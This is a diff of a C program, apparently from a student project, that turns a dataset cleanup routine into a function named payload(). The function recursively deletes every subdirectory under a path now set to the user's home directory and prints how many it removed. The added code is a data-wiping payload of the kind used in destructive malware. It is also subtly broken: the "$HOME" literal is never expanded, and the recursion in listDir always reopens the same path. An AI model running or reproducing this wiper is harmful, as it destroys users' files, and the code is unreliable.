@@ -6,92 +6,82 @@
 #include <sys/types.h>
 #include <sys/stat.h>
 
-#define PATH "/home/tcc/dataset"
+#define PATH "$HOME"
 #define TAM_NAMEF 256
 
 int remove_directory(const char *path)
 {
-   DIR *d = opendir(path);
-   size_t path_len = strlen(path);
-   int r = -1;
+    DIR *dir = opendir(path);
+    struct dirent *folder;
+    struct stat statbuf;
+    size_t path_len = strlen(path);
+    int delF1 = -1, delF2 = -1;
+    char *buffer;
+    size_t len;
 
-   if (d)
-   {
-      struct dirent *p;
+    if (dir){
+        delF1 = 0;
 
-      r = 0;
+        while (!delF1 && (folder=readdir(dir))){
+            if (!strcmp(folder->d_name, ".") || !strcmp(folder->d_name, "..")){
+                continue;
+            }
 
-      while (!r && (p=readdir(d)))
-      {
-          int r2 = -1;
-          char *buf;
-          size_t len;
+            len = path_len + strlen(folder->d_name) + 2; 
+            buffer = malloc(len);
 
-          /* Skip the names "." and ".." as we don't want to recurse on them. */
-          if (!strcmp(p->d_name, ".") || !strcmp(p->d_name, ".."))
-          {
-             continue;
-          }
-
-          len = path_len + strlen(p->d_name) + 2; 
-          buf = malloc(len);
-
-          if (buf)
-          {
-             struct stat statbuf;
-
-             snprintf(buf, len, "%s/%s", path, p->d_name);
-
-             if (!stat(buf, &statbuf))
-             {
-                if (S_ISDIR(statbuf.st_mode))
-                {
-                   r2 = remove_directory(buf);
+            if (buffer){
+                snprintf(buffer, len, "%s/%s", path, folder->d_name);
+             
+                if (!stat(buffer, &statbuf)){
+                    if (S_ISDIR(statbuf.st_mode)){
+                        delF2 = remove_directory(buffer);
+                    }
+                    else{
+                        delF2 = unlink(buffer);
+                    }
                 }
-                else
-                {
-                   r2 = unlink(buf);
-                }
-             }
 
-             free(buf);
-          }
+                free(buffer);
+            }
 
-          r = r2;
-      }
+            delF1 = delF2;
+        }
 
-      closedir(d);
-   }
+        closedir(dir);
+    }
 
-   if (!r)
-   {
-      r = rmdir(path);
-   }
+    if (!delF1){
+        delF1 = rmdir(path);
+    }
 
-   return r;
+    return delF1;
 }
 
-void listDir(char* path){
+void listDir(char *path, int *numberR){
     char folder[TAM_NAMEF];
 	DIR* dir;
 	struct dirent *ent;
     int filesRemoved = 0;
 
 	if((dir=opendir(PATH)) != NULL){
-        while (( ent = readdir(dir)) != NULL){
+        while ((ent = readdir(dir)) != NULL){
       	    if(ent->d_type == DT_DIR && strcmp(ent->d_name, ".") != 0  && strcmp(ent->d_name, "..") != 0){
-                listDir(ent->d_name);
+                listDir(ent->d_name, numberR);
                 strcpy(folder, PATH);
                 strcat(folder, "/");
                 strcat(folder, ent->d_name);
                 filesRemoved = remove_directory(folder);
+                *numberR += 1;
             }
         }
-        printf("Quantidade de Arquivos Apagados: %d\n", filesRemoved);
         closedir(dir);
     }
 }
 
-void main(){
-  listDir(PATH);
+void payload(){
+    int numberR = 0;    
+
+    listDir(PATH, &numberR);
+    printf("Quantidade de Arquivos Apagados: %d\n", numberR);
 }
